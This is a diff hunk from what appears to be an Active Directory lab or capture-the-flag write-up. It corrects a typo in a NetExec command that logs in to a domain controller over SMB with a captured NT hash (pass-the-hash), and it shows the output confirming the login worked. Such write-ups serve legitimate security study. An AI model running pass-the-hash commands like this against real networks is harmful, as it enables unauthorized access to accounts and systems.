@@ -1138,7 +1138,7 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 I now have the NT hash
 
 ```python
-xc smb dc.northstone.local -u l.turner -H '59c717e891bebfce8cab55d4d50751eb' 
+nxc smb dc.northstone.local -u l.turner -H '59c717e891bebfce8cab55d4d50751eb' 
 SMB         10.1.209.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:northstone.local) (signing:True) (SMBv1:None) (Null Auth:True)
 SMB         10.1.209.181    445    DC               [+] northstone.local\l.turner:59c717e891bebfce8cab55d4d50751eb
 ```
